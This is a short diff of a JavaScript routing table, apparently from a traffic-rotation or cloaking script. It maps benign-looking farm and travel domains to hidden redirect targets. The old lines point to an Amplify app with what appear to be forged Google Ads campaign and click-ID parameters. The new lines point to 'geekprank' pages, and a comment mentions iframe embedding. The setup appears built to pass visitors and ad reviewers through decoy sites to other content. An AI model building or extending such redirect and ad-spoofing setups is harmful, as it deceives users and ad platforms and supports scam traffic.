@@ -85,9 +85,9 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.farm": { method: "redirect", target: "https://main.d2kh28d1zdkn2l.amplifyapp.com/?gad_campaign=215687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJwWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
-    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d2kh28d1zdkn2l.amplifyapp.com/?gad_campaign=219687044&gclid=Ec0KCQjwv8PDPBhCeARIAOJwmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
-    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d2kh28d1zdkn2l.amplifyapp.com/?gad_campaign=213687044&gclid=Ec0KCQjwv8PDPBhCeARIsAOJmWVCKGU6_JuPIj1duXiZiqufAjBAEAL" },
+    "https://naotoshidairy.farm": { method: "redirect", target: "https://geekprank-82zo.onrender.com/?naotoshi" },
+    "https://takahirofarmfood.com": { method: "redirect", target: "https://geekprank-82zo.onrender.com/?takahiro" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://geekprank-82zo.onrender.com/?hiroaki" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
